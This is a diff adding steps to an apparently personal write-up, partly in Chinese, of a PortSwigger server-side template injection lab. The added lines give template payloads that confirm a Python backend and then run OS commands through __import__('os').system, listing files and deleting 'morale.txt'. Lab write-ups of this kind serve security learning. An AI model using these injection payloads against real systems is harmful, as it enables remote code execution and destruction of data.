@@ -43,10 +43,35 @@ https://portswigger.net/web-security/server-side-template-injection/exploiting/l
 ```
 blog-post-author-display=7*7&csrf=hQtKf7CiArqjjjwZVcj6BNQoOxPXPEfm
 ```
+>![](webSSTILab2Recc.png)
+> 7*7 -> 49
 
+```
+blog-post-author-display='7'*7&csrf=hQtKf7CiArqjjjwZVcj6BNQoOxPXPEfm
+
+
+blog-post-author-display='7*7&csrf=hQtKf7CiArqjjjwZVcj6BNQoOxPXPEfm
+```
+>![](webSSTILab2Recc2.png)
+>![](webSSTILab2Recc3.png)
+>可以發現是 python 後端
+
+之後嘗試用
 ```
 blog-post-author-display=dir(__builtins__)&csrf=hQtKf7CiArqjjjwZVcj6BNQoOxPXPEfm
 ```
+> ![](webSSTILab2FindPacketage.png)
+
+
+單純使用 system('ls') 會遇到 os not defind，所以要加上 `__import__('os')`
+```
+blog-post-author-display=__import__('os').system('ls')&csrf=2N6vi7b7I2kOpVuWutfwq1WwPMhusd6U
+```
+
+```
+blog-post-author-display=__import__('os').system('rm morale.txt')&csrf=2N6vi7b7I2kOpVuWutfwq1WwPMhusd6U
+```
+
 
 ### picoCTF SSTI1
 payload
